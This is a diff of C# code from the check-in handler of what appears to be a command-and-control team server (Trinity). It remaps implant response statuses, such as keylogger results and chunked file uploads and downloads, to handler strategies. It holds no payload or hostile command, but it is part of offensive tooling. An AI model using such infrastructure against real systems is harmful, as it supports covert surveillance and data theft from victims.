@@ -3,7 +3,6 @@ using System.Text.Json;
 using TeamServer.Handlers.CheckinHandler.Strategies;
 using Trinity.Shared.Enums.Tasks;
 using Trinity.Shared.Interfaces;
-using static Trinity.Shared.Enums.Tasks.Status;
 
 namespace TeamServer.Handlers.CheckinHandler
 {
@@ -26,13 +25,14 @@ namespace TeamServer.Handlers.CheckinHandler
         {
             _handlers = new Dictionary<Enum, Func<JsonElement, Task>>()
             {
-                { SUCCESS, (element) => successStrategy.ProcessResponseAsync(element) },
-                { TaskType.POWERSHELL, (element) => successStrategy.ProcessResponseAsync(element) },
-                { TaskType.KEYLOGGER_STOP, (element) => keyloggerStrategy.ProcessResponseAsync(element) },
-                { TaskType.UPLOAD, (element) => uploadStrategy.ProcessResponseAsync(element) },
-                { TaskType.DOWNLOAD, (element) => downloadStrategy.ProcessResponseAsync(element) },
-                { RUNNING, (element) =>  runningStrategy.ProcessResponseAsync(element) },
-                { ERROR, (element) => errorStrategy.ProcessResponseAsync(element) }
+                { Status.SUCCESS, (element) => successStrategy.ProcessResponseAsync(element) },
+                { Status.UPLOAD_CHUNK, (element) => uploadStrategy.ProcessResponseAsync(element) },
+                { Status.UPLOAD_FINAL, (element) => uploadStrategy.ProcessResponseAsync(element) },
+                { Status.DOWNLOAD_CHUNK, (element) => downloadStrategy.ProcessResponseAsync(element) },
+                { Status.DOWNLOAD_FINAL, (element) => downloadStrategy.ProcessResponseAsync(element) },
+                { Status.KEYLOGGER, (element) => keyloggerStrategy.ProcessResponseAsync(element) },
+                { Status.RUNNING, (element) => runningStrategy.ProcessResponseAsync(element) },
+                { Status.ERROR, (element) => errorStrategy.ProcessResponseAsync(element) }
             };
         }
 
